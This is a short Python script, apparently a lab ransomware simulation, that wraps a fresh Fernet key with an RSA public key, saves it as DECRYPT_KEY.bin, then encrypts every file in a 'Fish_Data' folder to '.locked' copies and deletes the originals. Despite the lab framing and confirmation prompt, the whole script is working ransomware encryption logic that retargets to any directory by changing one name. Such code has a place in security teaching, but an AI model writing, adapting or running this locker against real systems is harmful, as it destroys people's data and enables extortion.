import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

def encrypt_lab():
    if not os.path.exists("public.pem"):
        print("[-] Error: public.pem not found. Run gen_keys.py first.")
        return

    with open("public.pem", "rb") as f:
        public_key = serialization.load_pem_public_key(f.read())

    session_key = Fernet.generate_key()
    fernet = Fernet(session_key)

    encrypted_key = public_key.encrypt(
        session_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()), 
            algorithm=hashes.SHA256(), 
            label=None
        )
    )
    
    target_dir = "Fish_Data"
    if not os.path.exists(target_dir):
        print(f"[-] Error: {target_dir} directory not found.")
        return

    with open(os.path.join(target_dir, "DECRYPT_KEY.bin"), "wb") as f:
        f.write(encrypted_key)

    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if file == "DECRYPT_KEY.bin" or file.endswith(".locked"):
                continue
            
            file_path = os.path.join(root, file)
            
            with open(file_path, "rb") as f:
                original_data = f.read()
          
            encrypted_data = fernet.encrypt(original_data)
          
            new_file_path = file_path + ".locked"
            with open(new_file_path, "wb") as f:
                f.write(encrypted_data)
            
            os.remove(file_path)
            print(f"[!] Encrypted and renamed: {file} -> {file}.locked")

if __name__ == "__main__":
    confirm = input("Confirm encryption of 'Fish_Data' folder? (yes/no): ")
    if confirm.lower() == "yes":
        encrypt_lab()
        print("\n[+] Simulation Complete. Files are locked.")